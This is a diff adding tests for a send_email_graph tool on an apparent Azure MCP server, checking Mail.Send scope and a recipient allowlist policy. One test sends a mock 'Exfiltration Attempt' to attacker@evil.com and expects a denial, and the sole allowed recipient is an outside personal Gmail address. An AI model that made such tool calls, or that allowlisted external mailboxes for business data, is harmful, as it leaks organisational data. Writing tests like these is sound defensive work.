@@ -105,11 +105,12 @@ describe('Azure Low-Code MCP Server Tests (Protocol Spec July 2026)', () => {
     const res = await rpcRequest('tools/list', {});
     assert.strictEqual(res.jsonrpc, '2.0');
     assert.ok(Array.isArray(res.result.tools));
-    assert.strictEqual(res.result.tools.length, 2);
+    assert.strictEqual(res.result.tools.length, 3);
 
     const toolNames = res.result.tools.map(t => t.name);
     assert.ok(toolNames.includes('tool1'), 'Must include tool1');
     assert.ok(toolNames.includes('tool2'), 'Must include tool2');
+    assert.ok(toolNames.includes('send_email_graph'), 'Must include send_email_graph');
   });
 
   test('Regular User (Bob): Tool-level RBAC passes (mcp:tool1), but Cloud IAM denies storage access (HTTP 403 / AuthorizationPermissionMismatch)', async () => {
@@ -359,4 +360,77 @@ describe('Azure Low-Code MCP Server Tests (Protocol Spec July 2026)', () => {
     assert.strictEqual(res.result.audit.actingAgent, 'entra://a23206e1-2dda-4854-aac7-0536d2da2c4c');
     assert.strictEqual(res.result.audit.decision, 'ALLOWED');
   });
+
+  test('send_email_graph: Dispatches email successfully when user has Mail.Send scope and recipient is rtarway@gmail.com', async () => {
+    const aliceGraphToken = mintOboToken({
+      sub: 'alice@example.com',
+      scopes: ['Mail.Send']
+    });
+
+    const res = await rpcRequest(
+      'tools/call',
+      {
+        name: 'send_email_graph',
+        arguments: {
+          recipient: 'rtarway@gmail.com',
+          subject: 'Executive Summary Report',
+          body: 'Redacted financial overview for Q3.'
+        }
+      },
+      aliceGraphToken
+    );
+
+    assert.strictEqual(res.result.isError, false);
+    assert.strictEqual(res.result.audit.recipient, 'rtarway@gmail.com');
+    assert.strictEqual(res.result.audit.decision, 'ALLOWED');
+    assert.ok(res.result.content[0].text.includes('202'));
+  });
+
+  test('send_email_graph: Denies when caller lacks Mail.Send scope', async () => {
+    const bobToken = mintOboToken({
+      sub: 'bob@example.com',
+      scopes: ['mcp:tool1'] // Lacks Mail.Send
+    });
+
+    const res = await rpcRequest(
+      'tools/call',
+      {
+        name: 'send_email_graph',
+        arguments: {
+          recipient: 'rtarway@gmail.com',
+          subject: 'Unauthorized Email Attempt',
+          body: 'Content'
+        }
+      },
+      bobToken
+    );
+
+    assert.strictEqual(res.result.isError, true);
+    assert.ok(res.result.content[0].text.includes("lacks required scope 'Mail.Send'"));
+  });
+
+  test('send_email_graph: Denies via FGP when recipient is any address other than rtarway@gmail.com', async () => {
+    const aliceGraphToken = mintOboToken({
+      sub: 'alice@example.com',
+      scopes: ['Mail.Send']
+    });
+
+    const res = await rpcRequest(
+      'tools/call',
+      {
+        name: 'send_email_graph',
+        arguments: {
+          recipient: 'attacker@evil.com',
+          subject: 'Exfiltration Attempt',
+          body: 'Content'
+        }
+      },
+      aliceGraphToken
+    );
+
+    assert.strictEqual(res.result.isError, true);
+    assert.strictEqual(res.result.audit.decision, 'DENIED_BY_FGP');
+    assert.ok(res.result.content[0].text.includes('Fine-Grained Policy Denial'));
+  });
 });
+
